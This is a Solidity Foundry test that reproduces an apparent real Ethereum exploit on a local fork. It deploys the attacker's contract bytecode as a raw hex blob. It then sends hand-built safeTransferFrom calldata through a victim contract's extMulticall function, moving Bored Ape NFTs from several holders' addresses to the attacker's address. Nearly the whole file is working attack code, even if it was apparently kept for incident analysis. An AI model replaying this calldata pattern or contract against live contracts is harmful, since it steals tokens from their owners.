// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// https://explorer.phalcon.xyz/tx/eth/0xa329b27fbe0f7b7f92060a9e5370fdf03d60e5c4835f09d7234e5bbecf417ccf
// https://etherscan.io/address/0x4d0D746E0F66bf825418E6b3deF1a46Ec3c0B847

struct S1 {
    address p1;
    bytes p2;
}

interface I {
    function extMulticall(S1[] memory) external payable;
    function tokenOfOwnerByIndex(address, uint256) external payable;
    function balanceOf(address) external payable returns (uint256);
}

contract X7e54 is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0xa329b27fbe0f7b7f92060a9e5370fdf03d60e5c4835f09d7234e5bbecf417ccf");
    }

    address constant x0097 = 0x0097b9cFE64455EED479292671A1121F502bc954;
    address constant x3fb6 = 0x3FB65FEEAB83bf60B0D1FfBC4217d2D97a35C8D4;
    address constant x41af = 0x41af51792CDcfAB9bDC0239f1D1c274e0B2682Ae;
    address constant x49ad = 0x49AD262C49C7aA708Cc2DF262eD53B64A17Dd5EE;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x8607 = 0x8607a7D180de23645Db594D90621d837749408d5;
    address constant xbc4c = 0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D;
    address constant xf15c = 0xf15C93562bc3944a68e938ef75D2A3360D98ca57;
    address constant xf522 = 0xf5225e8312758F962E4ecfd8a4fcaf32f8d3e982;

    function test1() public {
        // vm.startPrank(0x4d0D746E0F66bf825418E6b3deF1a46Ec3c0B847, 0x4d0D746E0F66bf825418E6b3deF1a46Ec3c0B847);

        vm.createSelectFork("http://localhost:18545", 18802260); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0x4d8d7e6f2bdc49e724b8d2a0241cf31d0911a230fa17230c7f025cead1842e93));

        // https://explorer.phalcon.xyz/tx/eth/0x4d8d7e6f2bdc49e724b8d2a0241cf31d0911a230fa17230c7f025cead1842e93
        this.x4d8d7e6f();
        // https://explorer.phalcon.xyz/tx/eth/0xa329b27fbe0f7b7f92060a9e5370fdf03d60e5c4835f09d7234e5bbecf417ccf
        x6306e50a();
    }

    function test2() public {
        // vm.startPrank(0x4d0D746E0F66bf825418E6b3deF1a46Ec3c0B847, 0x4d0D746E0F66bf825418E6b3deF1a46Ec3c0B847);

        vm.createSelectFork("http://localhost:18545", 18802250); // tx.blockNumber - 1
        // https://explorer.phalcon.xyz/tx/eth/0x4d8d7e6f2bdc49e724b8d2a0241cf31d0911a230fa17230c7f025cead1842e93
        this.x4d8d7e6f();
        vm.warp(1702773815);
        vm.roll(18802260);
        // https://explorer.phalcon.xyz/tx/eth/0xa329b27fbe0f7b7f92060a9e5370fdf03d60e5c4835f09d7234e5bbecf417ccf
        x6306e50a();
    }

    function test3() public {
        // vm.startPrank(, );

        vm.createSelectFork("http://localhost:18545", 18802260); // tx.blockNumber - 1

        vm.warp(1702773815);
        vm.roll(18802261);
        // https://explorer.phalcon.xyz/tx/eth/0xa329b27fbe0f7b7f92060a9e5370fdf03d60e5c4835f09d7234e5bbecf417ccf
        x6306e50a();
    }

    function x6306e50a() public {
        // uint256 v1 = 0;
        uint256 v1 = I(xbc4c).balanceOf(x41af);
        console2.log("I(xbc4c).balanceOf(x41af)\t->", uint256(0));
        // uint256 v2 = 2;
        uint256 v2 = I(xbc4c).balanceOf(xf15c);
        console2.log("I(xbc4c).balanceOf(xf15c)\t->", uint256(2));
        I(xbc4c).tokenOfOwnerByIndex(xf15c, 0);
        I(xbc4c).tokenOfOwnerByIndex(xf15c, 1);

        bytes memory b01 =
            hex"42842e0e000000000000000000000000f15c93562bc3944a68e938ef75d2a3360d98ca570000000000000000000000004d0d746e0f66bf825418e6b3def1a46ec3c0b8470000000000000000000000000000000000000000000000000000000000001b18";
        S1 memory s101 = S1(xbc4c, b01);
        bytes memory b02 =
            hex"42842e0e000000000000000000000000f15c93562bc3944a68e938ef75d2a3360d98ca570000000000000000000000004d0d746e0f66bf825418e6b3def1a46ec3c0b8470000000000000000000000000000000000000000000000000000000000001497";
        S1 memory s102 = S1(xbc4c, b02);
        S1[] memory arr01 = new S1[](2);
        arr01[0] = s101;
        arr01[1] = s102;
        I(x49ad).extMulticall(arr01);

        // uint256 v3 = 1;
        uint256 v3 = I(xbc4c).balanceOf(x0097);
        console2.log("I(xbc4c).balanceOf(x0097)\t->", uint256(1));
        I(xbc4c).tokenOfOwnerByIndex(x0097, 0);

        bytes memory b05 =
            hex"42842e0e0000000000000000000000000097b9cfe64455eed479292671a1121f502bc9540000000000000000000000004d0d746e0f66bf825418e6b3def1a46ec3c0b847000000000000000000000000000000000000000000000000000000000000186f";
        S1 memory s105 = S1(xbc4c, b05);
        S1[] memory arr03 = new S1[](1);
        arr03[0] = s105;
        I(x49ad).extMulticall(arr03);

        // uint256 v4 = 9;
        uint256 v4 = I(xbc4c).balanceOf(x8607);
        console2.log("I(xbc4c).balanceOf(x8607)\t->", uint256(9));
        I(xbc4c).tokenOfOwnerByIndex(x8607, 0);
        I(xbc4c).tokenOfOwnerByIndex(x8607, v3);
        I(xbc4c).tokenOfOwnerByIndex(x8607, v2);
        I(xbc4c).tokenOfOwnerByIndex(x8607, 3);
        I(xbc4c).tokenOfOwnerByIndex(x8607, 4);
        I(xbc4c).tokenOfOwnerByIndex(x8607, 5);
        I(xbc4c).tokenOfOwnerByIndex(x8607, 6);
        I(xbc4c).tokenOfOwnerByIndex(x8607, 7);
        I(xbc4c).tokenOfOwnerByIndex(x8607, 8);

        bytes memory b07 =
            hex"42842e0e0000000000000000000000008607a7d180de23645db594d90621d837749408d50000000000000000000000004d0d746e0f66bf825418e6b3def1a46ec3c0b8470000000000000000000000000000000000000000000000000000000000002510";
        S1 memory s107 = S1(xbc4c, b07);
        bytes memory b08 =
            hex"42842e0e0000000000000000000000008607a7d180de23645db594d90621d837749408d50000000000000000000000004d0d746e0f66bf825418e6b3def1a46ec3c0b84700000000000000000000000000000000000000000000000000000000000011ab";
        S1 memory s108 = S1(xbc4c, b08);
        bytes memory b09 =
            hex"42842e0e0000000000000000000000008607a7d180de23645db594d90621d837749408d50000000000000000000000004d0d746e0f66bf825418e6b3def1a46ec3c0b8470000000000000000000000000000000000000000000000000000000000001010";
        S1 memory s109 = S1(xbc4c, b09);
        bytes memory b10 =
            hex"42842e0e0000000000000000000000008607a7d180de23645db594d90621d837749408d50000000000000000000000004d0d746e0f66bf825418e6b3def1a46ec3c0b847000000000000000000000000000000000000000000000000000000000000171a";
        S1 memory s110 = S1(xbc4c, b10);
        bytes memory b11 =
            hex"42842e0e0000000000000000000000008607a7d180de23645db594d90621d837749408d50000000000000000000000004d0d746e0f66bf825418e6b3def1a46ec3c0b8470000000000000000000000000000000000000000000000000000000000001762";
        S1 memory s111 = S1(xbc4c, b11);
        bytes memory b12 =
            hex"42842e0e0000000000000000000000008607a7d180de23645db594d90621d837749408d50000000000000000000000004d0d746e0f66bf825418e6b3def1a46ec3c0b8470000000000000000000000000000000000000000000000000000000000001783";
        S1 memory s112 = S1(xbc4c, b12);
        bytes memory b13 =
            hex"42842e0e0000000000000000000000008607a7d180de23645db594d90621d837749408d50000000000000000000000004d0d746e0f66bf825418e6b3def1a46ec3c0b84700000000000000000000000000000000000000000000000000000000000017ba";
        S1 memory s113 = S1(xbc4c, b13);
        bytes memory b14 =
            hex"42842e0e0000000000000000000000008607a7d180de23645db594d90621d837749408d50000000000000000000000004d0d746e0f66bf825418e6b3def1a46ec3c0b847000000000000000000000000000000000000000000000000000000000000027e";
        S1 memory s114 = S1(xbc4c, b14);
        bytes memory b15 =
            hex"42842e0e0000000000000000000000008607a7d180de23645db594d90621d837749408d50000000000000000000000004d0d746e0f66bf825418e6b3def1a46ec3c0b8470000000000000000000000000000000000000000000000000000000000001975";
        S1 memory s115 = S1(xbc4c, b15);
        S1[] memory arr05 = new S1[](9);
        arr05[0] = s107;
        arr05[1] = s108;
        arr05[2] = s109;
        arr05[3] = s110;
        arr05[4] = s111;
        arr05[5] = s112;
        arr05[6] = s113;
        arr05[7] = s114;
        arr05[8] = s115;
        I(x49ad).extMulticall(arr05);

        // uint256 v5 = 1;
        uint256 v5 = I(xbc4c).balanceOf(x3fb6);
        console2.log("I(xbc4c).balanceOf(x3fb6)\t->", uint256(1));
        I(xbc4c).tokenOfOwnerByIndex(x3fb6, 0);

        bytes memory b25 =
            hex"42842e0e0000000000000000000000003fb65feeab83bf60b0d1ffbc4217d2d97a35c8d40000000000000000000000004d0d746e0f66bf825418e6b3def1a46ec3c0b84700000000000000000000000000000000000000000000000000000000000016e8";
        S1 memory s125 = S1(xbc4c, b25);
        S1[] memory arr07 = new S1[](1);
        arr07[0] = s125;
        I(x49ad).extMulticall(arr07);

        // uint256 v6 = 1;
        uint256 v6 = I(xbc4c).balanceOf(xf522);
        console2.log("I(xbc4c).balanceOf(xf522)\t->", uint256(1));
        I(xbc4c).tokenOfOwnerByIndex(xf522, 0);

        bytes memory b27 =
            hex"42842e0e000000000000000000000000f5225e8312758f962e4ecfd8a4fcaf32f8d3e9820000000000000000000000004d0d746e0f66bf825418e6b3def1a46ec3c0b8470000000000000000000000000000000000000000000000000000000000002050";
        S1 memory s127 = S1(xbc4c, b27);
        S1[] memory arr09 = new S1[](1);
        arr09[0] = s127;
        I(x49ad).extMulticall(arr09);
    }

    function x4d8d7e6f() public {
        _constructor_();
    }

    function _constructor_() public {
        bytes memory rt =
            hex"60806040526004361061004e5760003560e01c8063150b7a021461005c5780636306e50a14610092578063b603cd80146100a7578063be6002c2146100bc578063df8de3e7146100e957610055565b3661005557005b6060516080f35b34801561006857600080fd5b5061007c610077366004610d75565b610109565b604051610089919061102a565b60405180910390f35b6100a56100a0366004610cf7565b610133565b005b3480156100b357600080fd5b506100a561067e565b3480156100c857600080fd5b506100dc6100d7366004610df3565b6106ad565b6040516100899190611038565b3480156100f557600080fd5b506100a5610104366004610cd9565b610747565b600080546001600160a01b0316321461012157600080fd5b50630a85bd0160e11b95945050505050565b6000546001600160a01b0316321461014a57600080fd5b33321461015657600080fd5b80156104175760005b828110156104115760006101a78686868581811061018d57634e487b7160e01b600052603260045260246000fd5b90506020020160208101906101a29190610cd9565b61087b565b90508051600014156101b957506103ff565b6000815167ffffffffffffffff8111156101e357634e487b7160e01b600052604160045260246000fd5b60405190808252806020026020018201604052801561022957816020015b6040805180820190915260008152606060208201528152602001906001900390816102015790505b50905060005b825181101561034f578782828151811061025957634e487b7160e01b600052603260045260246000fd5b60209081029190910101516001600160a01b03909116905286868581811061029157634e487b7160e01b600052603260045260246000fd5b90506020020160208101906102a69190610cd9565b338483815181106102c757634e487b7160e01b600052603260045260246000fd5b60200260200101516040516024016102e193929190610fd6565b60408051601f198184030181529190526020810180516001600160e01b0316632142170760e11b179052825183908390811061032d57634e487b7160e01b600052603260045260246000fd5b60200260200101516020018190525080806103479061110a565b91505061022f565b506000886001600160a01b03166397e4ee2a836040516024016103729190611019565b6040516020818303038152906040529060e01b6020820180516001600160e01b0383818316178352505050506040516103ab9190610fa1565b6000604051808303816000865af19150503d80600081146103e8576040519150601f19603f3d011682016040523d82523d6000602084013e6103ed565b606091505b50509050806103fb57600080fd5b5050505b806104098161110a565b91505061015f565b50610677565b60008267ffffffffffffffff81111561044057634e487b7160e01b600052604160045260246000fd5b60405190808252806020026020018201604052801561048657816020015b60408051808201909152600081526060602082015281526020019060019003908161045e5790505b50905060005b838110156105c857858282815181106104b557634e487b7160e01b600052603260045260246000fd5b60209081029190910101516001600160a01b039091169052600061050e878787858181106104f357634e487b7160e01b600052603260045260246000fd5b90506020020160208101906105089190610cd9565b8a610a97565b905085858381811061053057634e487b7160e01b600052603260045260246000fd5b90506020020160208101906105459190610cd9565b338260405160240161055993929190610fd6565b60408051601f198184030181529190526020810180516001600160e01b03166323b872dd60e01b17905283518490849081106105a557634e487b7160e01b600052603260045260246000fd5b6020026020010151602001819052505080806105c09061110a565b91505061048c565b506000866001600160a01b03166397e4ee2a836040516024016105eb9190611019565b6040516020818303038152906040529060e01b6020820180516001600160e01b0383818316178352505050506040516106249190610fa1565b6000604051808303816000865af19150503d8060008114610661576040519150601f19603f3d011682016040523d82523d6000602084013e610666565b606091505b505090508061067457600080fd5b50505b5050505050565b6000546001600160a01b031633148061069657503330145b61069f57600080fd5b6000546001600160a01b0316ff5b6000546060906001600160a01b03163314806106c857503330145b6106d157600080fd5b600080846001600160a01b0316846040516106ec9190610fa1565b6000604051808303816000865af19150503d8060008114610729576040519150601f19603f3d011682016040523d82523d6000602084013e61072e565b606091505b50915091508161073d57600080fd5b9150505b92915050565b6000546001600160a01b031633148061075f57503330145b61076857600080fd5b6040516370a0823160e01b81526000906001600160a01b038316906370a0823190610797903090600401610fad565b60206040518083038186803b1580156107af57600080fd5b505afa1580156107c3573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107e79190610e63565b905080156108775760005460405163a9059cbb60e01b81526001600160a01b038481169263a9059cbb9261082392909116908590600401610ffe565b602060405180830381600087803b15801561083d57600080fd5b505af1158015610851573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906108759190610e45565b505b5050565b606060006060846001600160a01b03168460405160240161089c9190610fad565b60408051601f198184030181529181526020820180516001600160e01b03166370a0823160e01b179052516108d19190610fa1565b600060405180830381855afa9150503d806000811461090c576040519150601f19603f3d011682016040523d82523d6000602084013e610911565b606091505b5090925090508161092157600080fd5b6000818060200190518101906109379190610e63565b905060008167ffffffffffffffff81111561096257634e487b7160e01b600052604160045260246000fd5b60405190808252806020026020018201604052801561098b578160200160208202803683370190505b50905060005b82811015610a8c57876001600160a01b031687826040516024016109b6929190610ffe565b60408051601f198184030181529181526020820180516001600160e01b0316632f745c5960e01b179052516109eb9190610fa1565b600060405180830381855afa9150503d8060008114610a26576040519150601f19603f3d011682016040523d82523d6000602084013e610a2b565b606091505b50909550935084610a3b57600080fd5b83806020019051810190610a4f9190610e63565b828281518110610a6f57634e487b7160e01b600052603260045260246000fd5b602090810291909101015280610a848161110a565b915050610991565b509695505050505050565b600080846001600160a01b03166370a08231856040518263ffffffff1660e01b8152600401610ac69190610fad565b60206040518083038186803b158015610ade57600080fd5b505afa158015610af2573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610b169190610e63565b90506000856001600160a01b031663dd62ed3e86866040518363ffffffff1660e01b8152600401610b48929190610fbb565b60206040518083038186803b158015610b6057600080fd5b505afa158015610b74573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610b989190610e63565b9050818111610ba5578091505b5090505b9392505050565b6000610bc3610bbe84611065565b611049565b905082815260208101848484011115610bdb57600080fd5b610be68482856110a1565b509392505050565b803561074181611151565b60008083601f840112610c0b57600080fd5b50813567ffffffffffffffff811115610c2357600080fd5b602083019150836020820283011115610c3b57600080fd5b9250929050565b803561074181611168565b805161074181611168565b60008083601f840112610c6a57600080fd5b50813567ffffffffffffffff811115610c8257600080fd5b602083019150836001820283011115610c3b57600080fd5b600082601f830112610cab57600080fd5b8135610cbb848260208601610bb0565b949350505050565b803561074181611170565b805161074181611170565b600060208284031215610ceb57600080fd5b6000610cbb8484610bee565b600080600080600060808688031215610d0f57600080fd5b6000610d1b8888610bee565b9550506020610d2c88828901610bee565b945050604086013567ffffffffffffffff811115610d4957600080fd5b610d5588828901610bf9565b93509350506060610d6888828901610c42565b9150509295509295909350565b600080600080600060808688031215610d8d57600080fd5b6000610d998888610bee565b9550506020610daa88828901610bee565b9450506040610dbb88828901610cc3565b935050606086013567ffffffffffffffff811115610dd857600080fd5b610de488828901610c58565b92509250509295509295909350565b60008060408385031215610e0657600080fd5b6000610e128585610bee565b925050602083013567ffffffffffffffff811115610e2f57600080fd5b610e3b85828601610c9a565b9150509250929050565b600060208284031215610e5757600080fd5b6000610cbb8484610c4d565b600060208284031215610e7557600080fd5b6000610cbb8484610cce565b6000610ba98383610f66565b610e9681611090565b82525050565b6000610ea6825190565b80845260208401935083602082028501610ec08560200190565b8060005b85811015610ef55784840389528151610edd8582610e81565b94506020830160209a909a0199925050600101610ec4565b5091979650505050505050565b6001600160e01b03198116610e96565b6000610f1c825190565b808452602084019350610f338185602086016110ad565b601f01601f19169290920192915050565b6000610f4e825190565b610f5c8185602086016110ad565b9290920192915050565b80516000906040840190610f7a8582610e8d565b5060208301518482036020860152610f928282610f12565b95945050505050565b80610e96565b6000610ba98284610f44565b602081016107418284610e8d565b60408101610fc98285610e8d565b610ba96020830184610e8d565b60608101610fe48286610e8d565b610ff16020830185610e8d565b610cbb6040830184610f9b565b6040810161100c8285610e8d565b610ba96020830184610f9b565b60208082528101610ba98184610e9c565b602081016107418284610f02565b60208082528101610ba98184610f12565b600061105460405190565b905061106082826110dd565b919050565b600067ffffffffffffffff82111561107f5761107f61113b565b601f19601f83011660200192915050565b60006001600160a01b038216610741565b82818337506000910152565b60005b838110156110c85781810151838201526020016110b0565b838111156110d7576000848401525b50505050565b601f19601f830116810181811067ffffffffffffffff821117156111035761110361113b565b6040525050565b600060001982141561111e5761111e611125565b5060010190565b634e487b7160e01b600052601160045260246000fd5b634e487b7160e01b600052604160045260246000fd5b61115a81611090565b811461116557600080fd5b50565b80151561115a565b8061115a56fea264697066735822122007c797583f4dbf56a87a58acdbda1f1a3ddf86fca00c48f3b66b380a6b92bf6c64736f6c63430008040033";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    fallback() external payable {
        revert("no such function");
    }
}
